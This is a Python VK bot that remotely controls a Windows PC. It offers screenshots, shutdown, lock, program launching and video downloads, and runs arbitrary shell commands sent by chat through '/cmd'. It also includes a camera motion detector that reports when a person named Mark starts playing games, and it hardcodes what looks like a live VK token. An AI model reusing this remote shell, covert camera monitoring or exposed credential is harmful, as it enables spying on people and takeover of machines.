# -*- coding: utf-8 -*-
"""
vk_bot.pyw — VK-бот с камерой, детектором движения и скачиванием видео
Один файл. Камера в фоне. Не блокирует бота.
"""

import vk_api
from vk_api.longpoll import VkLongPoll, VkEventType
from vk_api.keyboard import VkKeyboard, VkKeyboardColor
import subprocess
import os
import sys
import time
import random
import requests
import socket
import platform
import threading
import glob
from datetime import datetime
from PIL import ImageGrab, Image
from io import BytesIO

# ===== ИМПОРТЫ ДЛЯ КАМЕРЫ =====
import cv2

# ===== ИМПОРТЫ ДЛЯ СКАЧИВАНИЯ =====
import yt_dlp

# ===== ИМПОРТЫ НАШИХ МОДУЛЕЙ =====
try:
    import commands
    import auth
except ImportError as e:
    print(f"❌ Ошибка: {e}")
    print("Убедись, что commands.py и auth.py лежат рядом с vk_bot.pyw")
    input("Нажми Enter для выхода...")
    sys.exit(1)

# ============================================================
# НАСТРОЙКИ
# ============================================================
TOKEN = "vk1.a.517XnJRVi85ZZ6pBITZA4vBihrMBQ7x43cYW1uGq9joRm8532YibJj0VfrQ_NPBlQ_xb4x8fRUMwbILhKItvPWEiTc1eNLBHKUHdqO2lGCsHi1rQeUw1gsjqcq9v8VRRyUMfBavAsRGCdvZi6i6TyA2Fdia8Ab5_m0BvLdxlVQhu9cKqEyqHsraRiqt-wUAhi3fvALdkEnQheB4fVMpM2g"
GROUP_ID = 241449788

# ===== БЕЛЫЙ СПИСОК =====
ALLOWED_USERS = [
    881029017,        # ты
    7096810,
    1108741700,
    878539016,
]

# ============================================================
# НАСТРОЙКИ КАМЕРЫ
# ============================================================
CAMERA_URL = "http://192.168.0.180:8080/video"   # новый IP
MOTION_THRESHOLD = 5000
MOTION_TIME = 10
IDLE_TIME = 300
CHECK_INTERVAL = 1
NOTIFY_USER = 881029017

# ============================================================
# СОСТОЯНИЯ
# ============================================================
user_states = {}
camera_lock = threading.Lock()

# ============================================================
# АВТОРИЗАЦИЯ VK
# ============================================================
try:
    vk_session = vk_api.VkApi(token=TOKEN)
    vk = vk_session.get_api()
    longpoll = VkLongPoll(vk_session)
except Exception as e:
    print(f"❌ Ошибка авторизации VK: {e}")
    input("Нажми Enter для выхода...")
    sys.exit(1)

# ============================================================
# ФУНКЦИИ ОТПРАВКИ
# ============================================================
def send_message(user_id, text, keyboard=None):
    try:
        vk.messages.send(
            user_id=user_id,
            message=text[:4000],
            random_id=random.randint(1, 999999),
            keyboard=keyboard.get_keyboard() if keyboard else None
        )
    except Exception as e:
        print(f"Ошибка отправки: {e}")


def send_photo(user_id, photo_path):
    try:
        upload = vk_api.upload.VkUpload(vk_session)
        photo = upload.photo_messages(photo_path)[0]
        vk.messages.send(
            user_id=user_id,
            attachment=f"photo{photo['owner_id']}_{photo['id']}",
            random_id=random.randint(1, 999999)
        )
    except Exception as e:
        print(f"Ошибка фото: {e}")


def send_video(user_id, video_path):
    """Отправляет видео в VK как документ (играется в чате)"""
    try:
        if not os.path.exists(video_path):
            send_message(user_id, f"❌ Файл не найден: {video_path}")
            return

        size_mb = os.path.getsize(video_path) / (1024 * 1024)
        send_message(user_id, f"📤 Отправляю ({size_mb:.1f} МБ)...")

        # 1. Получаем сервер для загрузки документов
        upload_server = vk.docs.getMessagesUploadServer(
            type="doc",
            peer_id=user_id
        )
        upload_url = upload_server["upload_url"]

        # 2. Загружаем файл
        with open(video_path, "rb") as f:
            response = requests.post(
                upload_url,
                files={"file": f}
            )
        result = response.json()

        # 3. Сохраняем документ
        saved = vk.docs.save(
            file=result["file"],
            title=os.path.basename(video_path)
        )

        # 4. Отправляем
        doc = saved["doc"]
        attachment = f"doc{doc['owner_id']}_{doc['id']}"
        vk.messages.send(
            user_id=user_id,
            attachment=attachment,
            random_id=random.randint(1, 999999)
        )
        send_message(user_id, "✅ Видео отправлено!")
    except Exception as e:
        send_message(user_id, f"❌ Ошибка отправки видео:\n{e}")
        print(f"Ошибка видео: {e}")


# ============================================================
# ЗАХВАТ КАДРА
# ============================================================
def capture_frame():
    """Быстрый захват кадра с камеры"""
    with camera_lock:
        try:
            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = "timeout;5000"
            cap = cv2.VideoCapture(CAMERA_URL, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 5000)
            cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 5000)

            if not cap.isOpened():
                cap.release()
                return None

            for _ in range(3):
                cap.read()
                time.sleep(0.2)

            ret, frame = cap.read()
            cap.release()

            if ret and frame is not None:
                return frame
        except Exception as e:
            print(f"Ошибка кадра: {e}")
        return None


# ============================================================
# СКАЧИВАНИЕ ВИДЕО
# ============================================================
def download_media(url, user_id):
    """Скачивает видео по ссылке и отправляет в VK"""
    # Папка загрузок пользователя + vk_downloads
    downloads_dir = os.path.join(os.path.expanduser("~"), "Downloads", "vk_downloads")
    os.makedirs(downloads_dir, exist_ok=True)

    # Очищаем папку от старых файлов
    for f in os.listdir(downloads_dir):
        try:
            os.remove(os.path.join(downloads_dir, f))
        except:
            pass

    ydl_opts = {
        "outtmpl": os.path.join(downloads_dir, "%(title)s.%(ext)s"),
        "format": "bestvideo*+bestaudio/best",
        "merge_output_format": "mp4",
        "noplaylist": True,
        "quiet": True,
        "no_warnings": True,
        "max_filesize": 200 * 1024 * 1024,
        # ===== ФИКСЫ ОБРЫВА =====
        "retries": 10,
        "fragment_retries": 10,
        "skip_unavailable_fragments": True,
        "file_access_retries": 10,
        "extractor_retries": 10,
        "socket_timeout": 30,
    }

    try:
        send_message(user_id, "⏳ Скачиваю видео...")

        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            filename = ydl.prepare_filename(info)

        # Ищем файл
        if os.path.exists(filename):
            pass
        else:
            base, _ = os.path.splitext(filename)
            found = None
            for ext in [".mp4", ".mkv", ".webm", ".m4a", ".mov", ".avi"]:
                if os.path.exists(base + ext):
                    found = base + ext
                    break

            if not found:
                all_files = glob.glob(os.path.join(downloads_dir, "*"))
                if all_files:
                    found = max(all_files, key=os.path.getmtime)

            if not found:
                send_message(user_id, "❌ Файл не найден после скачивания")
                return

            filename = found

        # Отправляем видео
        send_video(user_id, filename)
        send_message(user_id, f"✅ Готово: {info.get('title', 'видео')}")

        # Удаляем файл
        if os.path.exists(filename):
            os.remove(filename)

    except Exception as e:
        send_message(user_id, f"❌ Ошибка: {e}")


# ============================================================
# ДЕТЕКТОР ДВИЖЕНИЯ (В ФОНЕ)
# ============================================================
def camera_detector():
    """Работает в фоне. Не блокирует бота."""
    while True:
        try:
            print("🎥 Подключение к камере...")

            os.environ["OPENCV_FFMPEG_CAPTURE_OPTIONS"] = (
                "timeout;5000|analyzeduration;1000000|probesize;1000000"
            )

            cap = cv2.VideoCapture(CAMERA_URL, cv2.CAP_FFMPEG)
            cap.set(cv2.CAP_PROP_OPEN_TIMEOUT_MSEC, 5000)
            cap.set(cv2.CAP_PROP_READ_TIMEOUT_MSEC, 5000)

            if not cap.isOpened():
                print("❌ Камера не отвечает. Жду 30 сек...")
                cap.release()
                time.sleep(30)
                continue

            send_message(NOTIFY_USER, "🎥 Камера подключена. Слежу за движением...")
            print("✅ Камера подключена")

            _, prev = cap.read()
            if prev is None:
                cap.release()
                time.sleep(10)
                continue

            prev_gray = cv2.cvtColor(prev, cv2.COLOR_BGR2GRAY)
            prev_gray = cv2.GaussianBlur(prev_gray, (21, 21), 0)

            motion_start = None
            last_motion = time.time()
            is_playing = False

            while True:
                ret, frame = cap.read()
                if not ret or frame is None:
                    print("⚠️ Потеря кадра. Переподключение...")
                    cap.release()
                    time.sleep(10)
                    break

                gray = cv2.cvtColor(frame, cv2.COLOR_BGR2GRAY)
                gray = cv2.GaussianBlur(gray, (21, 21), 0)

                diff = cv2.absdiff(prev_gray, gray)
                thresh = cv2.threshold(diff, 25, 255, cv2.THRESH_BINARY)[1]
                thresh = cv2.dilate(thresh, None, iterations=2)

                contours, _ = cv2.findContours(
                    thresh.copy(), cv2.RETR_EXTERNAL, cv2.CHAIN_APPROX_SIMPLE
                )

                motion = False
                for c in contours:
                    if cv2.contourArea(c) > MOTION_THRESHOLD:
                        motion = True
                        break

                now = time.time()

                if motion:
                    last_motion = now
                    if motion_start is None:
                        motion_start = now

                    if not is_playing and (now - motion_start) >= MOTION_TIME:
                        is_playing = True
                        filename = f"play_{int(now)}.jpg"
                        cv2.imwrite(filename, frame)

                        send_message(
                            NOTIFY_USER,
                            f"🎮 МАРК СЕЛ ИГРАТЬ!\n"
                            f"🕐 {datetime.now().strftime('%H:%M:%S')}\n"
                            f"📅 {datetime.now().strftime('%d.%m.%Y')}"
                        )
                        send_photo(NOTIFY_USER, filename)

                        if os.path.exists(filename):
                            os.remove(filename)

                        print(f"🎮 Начал играть: {datetime.now().strftime('%H:%M:%S')}")
                else:
                    motion_start = None

                    if is_playing and (now - last_motion) >= IDLE_TIME:
                        is_playing = False
                        send_message(
                            NOTIFY_USER,
                            f"🛑 Марк закончил играть\n"
                            f"🕐 {datetime.now().strftime('%H:%M:%S')}"
                        )
                        print(f"🛑 Закончил: {datetime.now().strftime('%H:%M:%S')}")

                prev_gray = gray
                time.sleep(CHECK_INTERVAL)

        except Exception as e:
            print(f"❌ Ошибка камеры: {e}")
            time.sleep(30)


# ============================================================
# КЛАВИАТУРЫ
# ============================================================
def kb_main():
    kb = VkKeyboard(one_time=False)
    kb.add_button("📸 Скриншот", color=VkKeyboardColor.PRIMARY)
    kb.add_button("📊 Статус", color=VkKeyboardColor.POSITIVE)
    kb.add_line()
    kb.add_button("⛔ Выключить", color=VkKeyboardColor.NEGATIVE)
    kb.add_button("🔄 Перезагрузить", color=VkKeyboardColor.SECONDARY)
    kb.add_line()
    kb.add_button("🔒 Блокировка", color=VkKeyboardColor.SECONDARY)
    kb.add_button("🖼️ Обои", color=VkKeyboardColor.PRIMARY)
    kb.add_line()
    kb.add_button("➡️ Программы", color=VkKeyboardColor.PRIMARY)
    kb.add_button("➡️ Приколы", color=VkKeyboardColor.PRIMARY)
    kb.add_line()
    kb.add_button("➡️ Система", color=VkKeyboardColor.PRIMARY)
    kb.add_button("➡️ Сайты", color=VkKeyboardColor.PRIMARY)
    kb.add_line()
    kb.add_button("🎥 Камера", color=VkKeyboardColor.POSITIVE)
    kb.add_button("📥 Скачать видео", color=VkKeyboardColor.PRIMARY)
    kb.add_line()
    kb.add_button("❓ Помощь", color=VkKeyboardColor.SECONDARY)
    return kb


def kb_programs():
    kb = VkKeyboard(one_time=False)
    kb.add_button("💻 CMD", color=VkKeyboardColor.SECONDARY)
    kb.add_button("⚡ PowerShell", color=VkKeyboardColor.SECONDARY)
    kb.add_line()
    kb.add_button("📝 Блокнот", color=VkKeyboardColor.SECONDARY)
    kb.add_button("🧮 Калькулятор", color=VkKeyboardColor.SECONDARY)
    kb.add_line()
    kb.add_button("📂 Проводник", color=VkKeyboardColor.SECONDARY)
    kb.add_button("📊 Диспетчер задач", color=VkKeyboardColor.SECONDARY)
    kb.add_line()
    kb.add_button("⬅️ Назад", color=VkKeyboardColor.NEGATIVE)
    return kb


# ============================================================
# ЗАПУСК
# ============================================================
print("=" * 60)
print("🔥 FSOCIETY VK BOT + CAMERA + DOWNLOADER")
print("=" * 60)
print(f"📋 Команд: {commands.get_commands_count()}")
print(f"👥 Пользователей: {len(auth.load_users())}")
print(f"📷 Камера: {CAMERA_URL}")
print("=" * 60)

# ===== ЗАПУСК КАМЕРЫ В ФОНЕ =====
threading.Thread(target=camera_detector, daemon=True).start()
print("🎥 Детектор камеры запущен в фоне...")

print("🔥 VK-бот запущен... Ожидание сообщений...")
print("=" * 60)


# ============================================================
# ОБРАБОТКА СООБЩЕНИЙ
# ============================================================
for event in longpoll.listen():
    if event.type == VkEventType.MESSAGE_NEW and event.to_me:
        user_id = event.user_id
        text = event.text.strip()
        text_lower = text.lower()
        attachments = event.attachments

        # ===== АВТОРИЗАЦИЯ =====
        user = auth.get_user_by_vk(user_id)

        if not user:
            state_data = user_states.get(user_id, {})
            state = state_data.get("state")

            if state == "waiting_code":
                nickname = state_data["nickname"]
                success, result = auth.vk_login_step2(nickname, text, user_id)
                if success:
                    del user_states[user_id]
                    send_message(user_id, f"✅ Вход выполнен! Добро пожаловать, {nickname}")
                    send_message(user_id, "🔥 Главное меню:", kb_main())
                else:
                    send_message(user_id, f"❌ {result}\nПопробуй ещё раз или напиши /start")
                continue

            elif state == "waiting_nickname":
                nickname = text
                success, msg = auth.vk_login_step1(nickname)
                if success:
                    user_states[user_id] = {"state": "waiting_code", "nickname": nickname}
                    send_message(user_id, "📧 Код отправлен на email.\nВведи его сюда (6 цифр).")
                else:
                    send_message(user_id, f"❌ {msg}\nПопробуй ещё раз или напиши /start")
                continue

            else:
                if text_lower in ["/start", "начать", "привет", "меню", "/menu"]:
                    user_states[user_id] = {"state": "waiting_nickname"}
                    send_message(user_id,
                        "🔐 FSOCIETY — ВХОД\n\n"
                        "Введи свой никнейм с сайта.\n\n"
                        "Если нет аккаунта — зарегистрируйся:\n"
                        "http://localhost:8080/register")
                else:
                    send_message(user_id, "🔐 Сначала войди. Напиши /start")
                continue

        # ===== АВТОРИЗОВАН =====
        nickname = user["nickname"]

        # ===== ФОТО (обои) =====
        if attachments and 'photo' in str(attachments):
            try:
                for att in attachments:
                    if att['type'] == 'photo':
                        owner_id = att['photo']['owner_id']
                        photo_id = att['photo']['id']
                        photo_info = vk.photos.getById(photos=f"{owner_id}_{photo_id}")[0]
                        sizes = photo_info['sizes']
                        max_size = max(sizes, key=lambda x: x['width'])
                        url = max_size['url']
                        send_message(user_id, "⏳ Устанавливаю обои...")
                        result = commands.set_wallpaper_url(url)
                        send_message(user_id, f"✅ {result}")
                        break
            except Exception as e:
                send_message(user_id, f"❌ Ошибка: {e}")
            continue

        # ===== КОМАНДЫ =====
        if text_lower in ["/start", "начать", "привет", "меню", "/menu"]:
            send_message(user_id, f"🔥 Привет, {nickname}!\nГлавное меню:", kb_main())

        elif text_lower == "🎥 камера" or text_lower == "/camera":
            send_message(user_id, "🎥 Смотрю...")
            frame = capture_frame()
            if frame is not None:
                filename = f"camera_{int(time.time())}.jpg"
                cv2.imwrite(filename, frame)
                send_photo(user_id, filename)
                os.remove(filename)
            else:
                send_message(user_id, "❌ Камера не отвечает. Перезапусти IP Webcam.")

        elif text_lower.startswith("/downloader"):
            parts = text.split(" ", 1)
            if len(parts) < 2 or not parts[1].strip():
                send_message(user_id, "📥 Отправь ссылку так:\n\n/downloader https://youtu.be/...")
            else:
                url = parts[1].strip()
                threading.Thread(target=download_media, args=(url, user_id), daemon=True).start()

        elif text_lower == "📥 скачать видео":
            send_message(user_id, "📥 Отправь ссылку с командой:\n\n/downloader <ссылка>")

        elif text_lower == "📸 скриншот" or text_lower == "/screenshot":
            try:
                send_message(user_id, "📸 Делаю скриншот...")
                img = ImageGrab.grab()
                path = f"screenshot_{int(time.time())}.png"
                img.save(path)
                send_photo(user_id, path)
                os.remove(path)
            except Exception as e:
                send_message(user_id, f"❌ Ошибка: {e}")

        elif text_lower == "📊 статус" or text_lower == "/status":
            send_message(user_id, commands.get_status())

        elif text_lower == "⛔ выключить" or text_lower == "/shutdown":
            send_message(user_id, commands.shutdown())

        elif text_lower == "🔄 перезагрузить" or text_lower == "/restart":
            send_message(user_id, commands.restart())

        elif text_lower == "🔒 блокировка" or text_lower == "/lock":
            send_message(user_id, commands.lock_pc())

        elif text_lower == "➡️ программы":
            send_message(user_id, "📁 Программы:", kb_programs())

        elif text_lower == "⬅️ назад":
            send_message(user_id, "🔥 Главное меню:", kb_main())

        elif text_lower == "❓ помощь" or text_lower == "/help":
            send_message(user_id, f"""
📋 FSOCIETY VK BOT

👤 Ты вошёл как: {nickname}

🔹 Управление:
/start — меню
/help — помощь
/screenshot — скриншот
/shutdown — выключить
/restart — перезагрузить
/lock — блокировка
/status — статус ПК

🎥 Камера:
🎥 Камера — текущий кадр

📥 Скачивание:
/downloader <ссылка> — скачать видео (YouTube, TikTok, Shorts)

🔹 Сайты:
/site <url> — открыть сайт
/wallpaper <url> — обои
/cmd <команда> — выполнить
            """)

        elif text_lower == "💻 cmd":
            send_message(user_id, commands.open_cmd())
        elif text_lower == "⚡ powershell":
            send_message(user_id, commands.open_powershell())
        elif text_lower == "📝 блокнот":
            send_message(user_id, commands.open_notepad())
        elif text_lower == "🧮 калькулятор":
            send_message(user_id, commands.open_calc())
        elif text_lower == "📂 проводник":
            send_message(user_id, commands.open_explorer())
        elif text_lower == "📊 диспетчер задач":
            send_message(user_id, commands.open_taskmgr())

        elif text_lower.startswith("/site "):
            url = text.split(" ", 1)[1]
            send_message(user_id, commands.open_url(url))

        elif text_lower.startswith("/wallpaper "):
            url = text.split(" ", 1)[1]
            send_message(user_id, commands.set_wallpaper_url(url))

        elif text_lower.startswith("/cmd "):
            cmd = text.split(" ", 1)[1]
            try:
                result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
                output = result.stdout or result.stderr or "OK"
                send_message(user_id, f"💻 {output[:3000]}")
            except Exception as e:
                send_message(user_id, f"❌ Ошибка: {e}")

        else:
            send_message(user_id, "❌ Неизвестная команда.\nНапиши /help или /start")